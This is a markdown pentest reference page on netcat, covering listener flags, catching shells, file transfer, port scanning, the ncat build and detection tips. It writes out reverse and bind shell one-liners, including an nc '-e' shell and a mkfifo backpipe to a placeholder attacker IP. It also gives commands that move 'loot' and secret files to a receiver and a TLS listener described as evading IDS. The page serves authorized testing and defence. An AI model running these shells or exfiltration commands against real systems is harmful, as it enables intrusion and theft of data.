# netcat (nc)

The TCP/UDP Swiss army knife: listen, connect, transfer, scan. On a pentest it's mostly used to **catch reverse shells** and **move files** when nothing nicer is on the box.

> Authorized testing only. Two builds exist and they differ — see [the `-e` trap](#the--e-trap) below.

## Contents

- [Flags you actually use](#flags-you-actually-use)
- [Catch a shell](#catch-a-shell)
- [The -e trap](#the--e-trap)
- [Transfer files](#transfer-files)
- [Port scanning & banner grabbing](#port-scanning--banner-grabbing)
- [Chat / test a listener](#chat--test-a-listener)
- [ncat (the nmap build)](#ncat-the-nmap-build)
- [Defense / detection](#defense--detection)
- [Related](#related)

## Flags you actually use

| Flag | Does |
| --- | --- |
| `-l` | Listen mode (server) |
| `-v` / `-vv` | Verbose — you want this to see connections |
| `-n` | No DNS resolution (faster, quieter) |
| `-p <port>` | Port |
| `-e <prog>` | Execute a program on connect — **traditional/ncat only, not OpenBSD** |
| `-u` | UDP instead of TCP |
| `-w <secs>` | Timeout — stops scans and transfers hanging |
| `-k` | Keep listening after a client disconnects (ncat / some builds) |
| `-z` | Zero-I/O — scan only, send no data |

Mnemonic for the listener: **`-lvnp`** = listen, verbose, no-DNS, port.

## Catch a shell

```bash
nc -lvnp 4444                 # listen; run a reverse shell one-liner on the target
rlwrap nc -lvnp 4444          # rlwrap = arrow keys + history in the catch (big quality-of-life win)
```

Then upgrade the raw shell to a real TTY — see [shell → Upgrade to a full TTY](shell.md#upgrade-to-a-full-tty). Reverse-shell payloads are in [shell](shell.md).

## The -e trap

`-e` executes a program when a connection arrives — the basis of a classic bind/reverse shell:

```bash
# bind shell on the target (you then connect IN to it)
nc -lvnp 4444 -e /bin/sh
# reverse shell from the target (it connects OUT to you)
nc YOUR_IP 4444 -e /bin/sh
```

**But `-e` is compiled out of the OpenBSD netcat shipped on most modern Linux.** If you get `invalid option -- 'e'`, use the `mkfifo` backpipe instead:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc YOUR_IP 4444 > /tmp/f
```

That reproduces `-e` with a named pipe: nc's output feeds the shell's input, the shell's output goes back to nc. Works on every build.

## Transfer files

No HTTP/SCP on the box? nc moves bytes either direction. **Start the receiver first.**

```bash
# receiver                          # sender
nc -lvnp 4444 > loot.tar            nc RECEIVER_IP 4444 < loot.tar

# pull a file FROM a listener instead
nc -lvnp 4444 < secret.txt          nc SENDER_IP 4444 > secret.txt
```

nc has no end-of-transfer signal, so it won't close itself — add `-w 3` (or `-q 0` on the sender for traditional nc) so it hangs up when the stream goes idle:

```bash
nc -lvnp 4444 -w 3 > loot.tar
```

Verify the copy arrived intact — nc does no integrity checking:

```bash
sha256sum loot.tar      # compare both ends
```

Stream a whole directory in one shot:

```bash
# receiver
nc -lvnp 4444 | tar xzvf -
# sender
tar czf - /path/to/dir | nc RECEIVER_IP 4444
```

## Port scanning & banner grabbing

nc isn't a scanner ([nmap](../Tools/nmap.md) is) but it's handy when nmap isn't available:

```bash
nc -zvn 10.10.10.40 20-1000        # -z scan, -v show results, -n no-DNS
nc -zvnu 10.10.10.40 53 161        # -u UDP
echo "" | nc -vn 10.10.10.40 22    # banner grab a single service
```

## Chat / test a listener

Confirm your handler is actually reachable before you fire a payload — one nc talks to the other:

```bash
nc -lvnp 4444          # box A
nc BOX_A_IP 4444       # box B — type, it appears on A
```

Useful for proving egress from a target: run the listener on your box, connect out from the target, and if text crosses, that port is allowed outbound.

## ncat (the nmap build)

`ncat` ships with [nmap](../Tools/nmap.md) and restores `-e` plus adds TLS and access control — nicer when you control the box it's on:

```bash
ncat -lvnp 4444 --ssl              # encrypted listener (evades plaintext IDS signatures)
ncat -lvnp 4444 -e /bin/bash --allow 10.10.14.5   # exec, restricted to one source IP
ncat --ssl TARGET 4444             # matching encrypted client
```

## Defense / detection

- Outbound connections to odd high ports from a server that normally only serves — especially from `www-data`, a DB user, or any service account — are the signature of a reverse shell.
- `nc`, `ncat`, `socat` or `/dev/tcp` in shell history, process lists, or a parent-child like `httpd → sh → nc` is worth investigating.
- A listening port backed by `/bin/sh`/`/bin/bash` is a bind shell.
- Egress filtering (default-deny outbound) breaks most reverse shells; plaintext nc is trivially caught by IDS, but `--ssl`/socat-TLS is not, so don't rely on content inspection alone.
- See [Host-based logging on Linux](../../Defense/Logging/Host-based/Linux.md) and [Abnormal User Behavior](../../Defense/SOC2/Abnormal%20User%20Behavior.md).

## Related

[shell](shell.md) · [pwncat](pwncat.md) · [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md) · [nmap](../Tools/nmap.md) (ncat ships with it) · [Pivoting & Tunneling](../Networking/Pivoting%20%26%20Tunneling.md) · [revshells.com](https://www.revshells.com)
